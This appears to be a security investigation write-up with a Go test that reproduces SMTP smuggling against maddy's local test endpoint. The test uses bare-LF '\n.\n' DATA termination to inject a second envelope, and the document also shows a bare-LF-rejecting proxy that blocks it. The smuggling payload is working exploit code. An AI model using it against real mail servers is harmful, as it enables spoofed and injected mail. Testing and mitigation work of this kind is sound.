With that in place, I used a live SMTP endpoint from the existing smtp tests and connected via a raw TCP client so I could send message data that deliberately mixes line endings. The main thing I wanted to observe was whether the server only ever treats <CR><LF>.<CR><LF> as the end of DATA, or whether a bare-LF terminator like \n.\n can prematurely end DATA and effectively let the remainder of the client stream be parsed as SMTP commands. That is the smuggling style mismatch in practice because some peers normalize or tolerate bare LF and others do not, so a downstream hop can see a different boundary than an upstream hop.

To keep the evidence easy to compare, I treated these as three payload variants with the same overall shape and one key parameter, the DATA boundary framing. I used a baseline variant that ends DATA normally, an ambiguous framing variant that injects bare-LF \n.\n inside DATA and then appends a second envelope, and a proxy-blocked variant where the same ambiguous framing is rejected before it reaches maddy.

Before getting into the smuggling case, I also ran the existing SMTP delivery tests to anchor what “normal” looks like in maddy’s SMTP endpoint under its test harness. The useful part for this investigation is that the server logs are already structured around message lifecycle markers, so you can correlate “incoming message”, “RCPT ok”, “accepted”, and “aborted” to where the SMTP session is in MAIL, RCPT, DATA, and cleanup.

Those two paths show the two “end states” I care about for smuggling. In the success path, there is an accepted log entry with a msg_id, which means the server has finished reading DATA, handed the body to the pipeline, and committed delivery. In the failure path, there is a DATA error with a reason plus an aborted log entry for the same msg_id, which is the signature that the message was not accepted and the delivery state was torn down.

To generate the smuggling behavior on demand, I wrote a temporary Go test in internal/endpoint/smtp named smtp_smuggling_runtime_test.go that spins up the same in-process SMTP endpoint test harness and then connects via raw TCP so I can send a payload that includes a bare-LF sequence inside DATA. The smuggling part is in the ambiguous framing payload: it injects \n.\n to terminate DATA early from the server’s point of view, then immediately appends a second SMTP envelope so those bytes get interpreted as commands after the early boundary.

This is the baseline payload, and it is the message content written after the server replies 354.

```text
From: <sender@example.org>\r\nSubject: baseline\r\n\r\nhello\r\n\r\n.\r\n
```

This is the ambiguous framing payload, and it is the message content written after the server replies 354. The important part is that it contains a bare-LF end marker \n.\n inside DATA, followed immediately by SMTP commands for a second envelope.

```text
From: <sender@example.org>\r\nSubject: ambiguous\r\n\r\nhello\n.\nRSET\r\nMAIL FROM:<smuggle@example.org>\r\nRCPT TO:<smuggled@example.com>\r\nDATA\r\nFrom: <smuggle@example.org>\r\nSubject: second\r\n\r\nsecond\r\n\r\n.\r\n
```

This is the proxy-blocked payload, and it is the message content written after the server replies 354 in the proxy path. It uses the same bare-LF \n.\n framing, but the front proxy blocks it, so maddy sees an unexpected EOF during DATA rather than queuing acceptance.

```text
From: <sender@example.org>\r\nSubject: proxy\r\n\r\nhello\n.\n
```

```go
package smtp

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"strings"
	"testing"
	"time"

	"github.com/foxcpp/maddy/internal/testutils"
)

func TestSMTPSmugglingRuntime(t *testing.T) {
	tgt := testutils.Target{}
	endp := testEndpoint(t, "smtp", nil, &tgt, nil, nil)
	defer endp.Close()

	dial := func() (net.Conn, *bufio.Reader) {
		c, err := net.DialTimeout("tcp", "127.0.0.1:"+testPort, 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		return c, bufio.NewReader(c)
	}

	readLine := func(c net.Conn, br *bufio.Reader, d time.Duration) (string, error) {
		_ = c.SetReadDeadline(time.Now().Add(d))
		line, err := br.ReadString('\n')
		if err != nil {
			return "", err
		}
		return line, nil
	}

	readUntilCode := func(c net.Conn, br *bufio.Reader, codePrefix string, d time.Duration) (string, error) {
		var out strings.Builder
		for {
			line, err := readLine(c, br, d)
			if err != nil {
				return out.String(), err
			}
			out.WriteString(line)
			if len(line) >= 4 && strings.HasPrefix(line, codePrefix) && line[3] == ' ' {
				return out.String(), nil
			}
		}
	}

	writeRaw := func(c net.Conn, s string) {
		_ = c.SetWriteDeadline(time.Now().Add(2 * time.Second))
		if _, err := io.WriteString(c, s); err != nil {
			t.Fatal(err)
		}
	}

	doHandshake := func(t *testing.T, c net.Conn, br *bufio.Reader) {
		t.Helper()
		_, err := readLine(c, br, 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		writeRaw(c, "EHLO mx.example.org\r\n")
		if _, err := readUntilCode(c, br, "250", 2*time.Second); err != nil {
			t.Fatal(err)
		}
		writeRaw(c, "MAIL FROM:<sender@example.org>\r\n")
		if _, err := readUntilCode(c, br, "250", 2*time.Second); err != nil {
			t.Fatal(err)
		}
		writeRaw(c, "RCPT TO:<rcpt@example.com>\r\n")
		if _, err := readUntilCode(c, br, "250", 2*time.Second); err != nil {
			t.Fatal(err)
		}
		writeRaw(c, "DATA\r\n")
		if _, err := readUntilCode(c, br, "354", 2*time.Second); err != nil {
			t.Fatal(err)
		}
	}

	t.Run("baseline", func(t *testing.T) {
		c, br := dial()
		defer c.Close()

		banner, err := readLine(c, br, 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		t.Log("S:", strings.TrimRight(banner, "\r\n"))

		writeRaw(c, "EHLO mx.example.org\r\n")
		ehlo, err := readUntilCode(c, br, "250", 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		t.Log("S:", strings.TrimRight(ehlo, "\r\n"))

		writeRaw(c, "MAIL FROM:<sender@example.org>\r\n")
		ok, err := readUntilCode(c, br, "250", 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		t.Log("S:", strings.TrimRight(ok, "\r\n"))

		writeRaw(c, "RCPT TO:<rcpt@example.com>\r\n")
		ok, err = readUntilCode(c, br, "250", 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		t.Log("S:", strings.TrimRight(ok, "\r\n"))

		writeRaw(c, "DATA\r\n")
		data, err := readUntilCode(c, br, "354", 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		t.Log("S:", strings.TrimRight(data, "\r\n"))

		msg := "From: <sender@example.org>\r\nSubject: baseline\r\n\r\nhello\r\n\r\n.\r\n"
		writeRaw(c, msg)
		accepted, err := readUntilCode(c, br, "250", 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		t.Log("S:", strings.TrimRight(accepted, "\r\n"))
	})

	t.Run("ambiguous_boundary", func(t *testing.T) {
		before := len(tgt.Messages)
		c, br := dial()
		defer c.Close()

		doHandshake(t, c, br)

		payload := "From: <sender@example.org>\r\nSubject: ambiguous\r\n\r\nhello\n.\n" +
			"RSET\r\n" +
			"MAIL FROM:<smuggle@example.org>\r\n" +
			"RCPT TO:<smuggled@example.com>\r\n" +
			"DATA\r\n" +
			"From: <smuggle@example.org>\r\nSubject: second\r\n\r\nsecond\r\n\r\n.\r\n"
		writeRaw(c, payload)

		var transcript strings.Builder
		for {
			line, err := readLine(c, br, 400*time.Millisecond)
			if err != nil {
				transcript.WriteString("read error: " + err.Error() + "\n")
				break
			}
			transcript.WriteString(line)
		}
		t.Log("server transcript:\n" + strings.TrimRight(transcript.String(), "\r\n"))

		after := len(tgt.Messages)
		t.Logf("target message count before=%d after=%d delta=%d", before, after, after-before)
		if after-before >= 1 {
			m := tgt.Messages[before]
			t.Logf("ambiguous msg1 msg_id=%s body=%q", m.MsgMeta.ID, string(m.Body))
		}
		if after-before >= 2 {
			m := tgt.Messages[before+1]
			t.Logf("ambiguous msg2 msg_id=%s body=%q", m.MsgMeta.ID, string(m.Body))
		}
		if after > 0 {
			last := tgt.Messages[after-1]
			t.Logf("last msg_id=%s body_len=%d contains literal \\n.\\n=%v", last.MsgMeta.ID, len(last.Body), bytes.Contains(last.Body, []byte("\n.\n")))
		}
	})

	t.Run("proxy_blocks_ambiguous_framing", func(t *testing.T) {
		backendAddr := "127.0.0.1:" + testPort
		pl, err := net.Listen("tcp", "127.0.0.1:0")
		if err != nil {
			t.Fatal(err)
		}
		defer pl.Close()

		done := make(chan struct{})
		go func() {
			defer close(done)
			client, err := pl.Accept()
			if err != nil {
				return
			}
			defer client.Close()

			server, err := net.Dial("tcp", backendAddr)
			if err != nil {
				return
			}
			defer server.Close()

			errCh := make(chan error, 2)
			pipe := func(dst, src net.Conn, inspect bool) {
				buf := make([]byte, 4096)
				var prev byte
				for {
					_ = src.SetReadDeadline(time.Now().Add(2 * time.Second))
					n, rerr := src.Read(buf)
					if n > 0 && inspect {
						for i := 0; i < n; i++ {
							b := buf[i]
							if b == '\n' && prev != '\r' {
								errCh <- fmt.Errorf("proxy blocked bare LF")
								return
							}
							prev = b
						}
					} else if n > 0 {
						prev = buf[n-1]
					}
					if n > 0 {
						_, _ = dst.Write(buf[:n])
					}
					if rerr != nil {
						errCh <- rerr
						return
					}
				}
			}

			go pipe(server, client, true)
			go pipe(client, server, false)

			select {
			case <-time.After(3 * time.Second):
			case <-errCh:
			}
		}()

		c, err := net.DialTimeout("tcp", pl.Addr().String(), 2*time.Second)
		if err != nil {
			t.Fatal(err)
		}
		br := bufio.NewReader(c)

		doHandshake(t, c, br)

		writeRaw(c, "From: <sender@example.org>\r\nSubject: proxy\r\n\r\nhello\n.\n")
		_, err = readLine(c, br, 1*time.Second)
		t.Log("proxy path read after bare LF:", err)

		_ = c.Close()
		<-done
	})

	t.Run("repeated_attempts", func(t *testing.T) {
		success := 0
		fail := 0
		for i := 0; i < 5; i++ {
			before := len(tgt.Messages)
			c, br := dial()
			doHandshake(t, c, br)

			payload := "From: <sender@example.org>\r\nSubject: ambiguous\r\n\r\nhello\n.\n" +
				"MAIL FROM:<smuggle@example.org>\r\n" +
				"RCPT TO:<smuggled@example.com>\r\n" +
				"DATA\r\n" +
				"From: <smuggle@example.org>\r\nSubject: second\r\n\r\nsecond\r\n\r\n.\r\n"
			writeRaw(c, payload)

			_ = c.SetReadDeadline(time.Now().Add(800 * time.Millisecond))
			_, _ = br.ReadBytes('\n')
			_ = c.Close()

			after := len(tgt.Messages)
			if after-before == 2 {
				success++
			} else {
				fail++
			}
		}
		t.Logf("repeated attempts results success=%d fail=%d", success, fail)
	})
}
```

The baseline shows the expected boundary: after the server says 354 and I send a well formed message ending in <CR><LF>.<CR><LF>, it emits a single 250 reply and the server side log prints accepted for msg_id ee83a859. That combination is the observable marker that the DATA reader reached its terminator, the message was committed, and the session returned to command parsing.

In terms of where that acceptance first becomes observable inside the repository itself, the SMTP endpoint logs the accepted event after the message body is prepared, handed to the delivery pipeline, and committed, which is the point where the server has already decided that DATA is complete and safe to finalize.

```go
// From internal/endpoint/smtp/smtp.go
func (s *Session) Data(r io.Reader) error {
	// ...
	header, buf, err := s.prepareBody(bodyCtx, r)
	if err != nil {
		return wrapErr(err)
	}

	if err := s.delivery.Body(bodyCtx, header, buf); err != nil {
		return wrapErr(err)
	}

	if err := s.delivery.Commit(bodyCtx); err != nil {
		return wrapErr(err)
	}

	s.log.Msg("accepted", "msg_id", s.msgMeta.ID)
	// ...
	return nil
}
```

The ambiguous framing attempt is where the mismatch becomes concrete. The injected message data contained a bare-LF end marker \n.\n inside what the client was otherwise treating as message body. The runtime evidence shows the first message was accepted and committed as msg_id 347fe85f even though the terminator used was not <CR><LF>.<CR><LF>, and the delivered message body for that msg_id is exactly "hello\n". Right after that, in the same TCP session, the bytes that followed were interpreted as SMTP commands, which is visible in the server transcript as a successful Session reset and then a complete second MAIL and DATA sequence, culminating in a second accepted message with msg_id 8bd60937 and body "second\n\n". The crucial point is that the server accepted two messages in one session from a single DATA entry point where the boundary between message and commands was forced by bare LF framing, and the proof is the delta of 2 in the in memory delivery target plus the two distinct accepted log events and msg_id values.

This is the practical bypass pattern you were asking for. In a real deployment, if an upstream component does not treat \n.\n as an end of DATA but a downstream component does, or the reverse, an attacker can craft a single on the wire stream that is parsed as one message by one hop and two messages by the other hop. In the run above, maddy accepts the early boundary and resumes command parsing, so the remainder of the same on the wire stream can be used to inject a second envelope with a different MAIL FROM and RCPT TO. The transcript makes that visible because you see 250 OK queued for the first message, then 250 Session reset, then a second 354, then 250 OK queued again.

For the higher pressure question about whether this changes across attempts, I added a quick repeat loop that replays the same pattern five times back to back. The runtime result was success=5 fail=0, and the server logs show ten additional incoming message events and accepted events, one pair per attempt, which tells me the boundary decision is stable for this pattern rather than something flaky that only happens under rare timing.

For the prevention side, I repeated the same kind of attempt through a very small front proxy that simply rejects any bare LF on the client to server direction. This does not require changing maddy at all and it is exactly the kind of edge normalization layer you would put in front of an SMTP service if you want to guarantee that ambiguous framing never reaches the server. In the proxy run above, the client observes EOF right after sending the bare LF, and on the server side maddy logs a DATA error with reason unexpected EOF for msg_id 4982fcc9 and then logs aborted for the same msg_id. That is the observable signature of a mid stream failure with cleanup, and it also demonstrates the absence of partial acceptance because there is no accepted log line for that msg_id and the proxy cut the connection before any queued response was emitted.

The lingering state question is easiest to answer from those same logs and from what does not appear. In the successful smuggling case, each accepted message has an accepted log line and a msg_id and shows up in the target message list as a fully committed body, which means the delivery state was finalized. In the proxy blocked case, the DATA error and aborted log lines are the end of the story for that msg_id, and I do not see a second accepted message or a stray queued response after the error, which matches the expectation that the delivery is torn down when the DATA stream ends unexpectedly rather than leaving a half committed message behind.
